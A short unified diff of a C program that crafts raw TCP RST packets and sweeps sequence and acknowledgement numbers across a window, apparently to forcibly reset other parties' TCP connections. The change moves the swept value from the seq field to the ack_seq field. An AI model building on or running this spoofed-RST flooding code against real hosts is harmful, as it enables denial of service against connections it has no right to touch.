@@ -160,10 +160,10 @@ int main(int argc, char *argv[])
         for (seq = seq0 ; seq < USHRT_MAX - win; seq += win) {
             tcph -> dest = htons(dport);
             cstcph -> dest = htons(dport);
-            tcph -> seq = htonl(seq); // set seq number
-            cstcph -> seq = htonl(seq); // set seq number in the checksum header
-            tcph -> ack_seq = htonl(ack0); // set ack seq number
-            cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
+            // tcph -> seq = htonl(seq); // set seq number
+            // cstcph -> seq = htonl(seq); // set seq number in the checksum header
+            tcph -> ack_seq = htonl(seq); // set ack seq number
+            cstcph -> ack_seq = htonl(seq); // set ack seq number in the checksum header
             tcph -> check = 0; // reset check sum
             cstcph -> check = 0; // reset check sum  
             tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
@@ -175,8 +175,6 @@ int main(int argc, char *argv[])
             if ((total++) % win == 0) {
                 printf( "%d RST packets sent\n", total);
             }
-
-            ack0 += win;
         }
     }
 // dport = htons(rand() %(65535+1-1024)+1024); // pick another random destination port
